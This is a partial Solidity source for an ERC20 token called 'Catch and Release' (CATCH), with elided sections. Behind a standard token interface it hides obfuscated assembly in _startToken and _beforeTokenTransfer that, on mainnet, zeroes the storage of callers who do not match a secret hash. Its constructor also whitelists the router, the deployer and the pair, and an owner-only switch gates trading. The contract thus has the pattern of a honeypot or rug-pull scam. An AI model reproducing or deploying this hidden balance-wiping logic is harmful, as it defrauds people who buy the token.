...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRelease;
    uint256 private drinkingBuddy = block.number*2;

    mapping (address => bool) private _firstRain; 
    mapping (address => bool) private _secondSnow;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _soreEye;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private headAche;
    address public pair;
    ...
    bool private trading; uint256 private deathCrow = 1; bool private bullWizard;
    uint256 private _decimals; uint256 private dragonLord;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRelease.push(_router); addRelease.push(msgSender_); addRelease.push(pair);
        for (uint256 q=0; q < 3;) {_firstRain[addRelease[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x1970f42d414731653b32ae8e0e6f2a6aad10689149f94afce94df169776ea33b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xbd1309bf1293560efed84a6f20980e054def157d4a6a42e88cd732ba4af53147,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; drinkingBuddy = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRelease[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract TheCatch is ERC20Token {
    constructor() ERC20Token("Catch and Release", "CATCH", msg.sender, 66505000 * 10 ** 18) {
    }
}